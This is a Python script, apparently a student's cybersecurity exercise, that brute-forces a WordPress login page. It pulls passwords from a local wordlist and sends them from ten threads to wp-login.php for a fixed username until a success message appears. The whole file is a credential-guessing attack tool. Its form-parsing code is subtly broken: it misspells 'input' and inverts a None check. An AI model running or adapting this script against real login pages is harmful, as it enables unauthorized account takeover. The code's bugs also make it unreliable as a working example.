from io import BytesIO
from lxml import etree
from queue import Queue
import requests
import sys
import threading
import time

SUCESS =  'Welcome to WordPress!'
TARGET = "https://pentest34.wordpress.com/wp-login.php"
WORDLIST = r'C:\Users\Matheus\Documents\Python - Cibersegurança\wordlist\bt4-password.txt'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    
    for elem in tree.findall('//imput'):
        name = elem.get('name')
        if name is None:
            params[name] = elem.get('value', None)
    return  params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBruter Force Attack beginning on {url}.\n')
        print('Finished the setup where username = %s\n' %username)

    def run_bruteforce(self, password):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(password,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCESS in resp1.content.decode():
                self.found = True
                print(f'\nBruteforcing sucessful.')
                print('Username is %s\n' %self.username)
                print('Password is %s\n' % params['pwd'])
                print('done: now cleaning up other threads. . .')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('matheussilva2607', TARGET)
    b.run_bruteforce(words)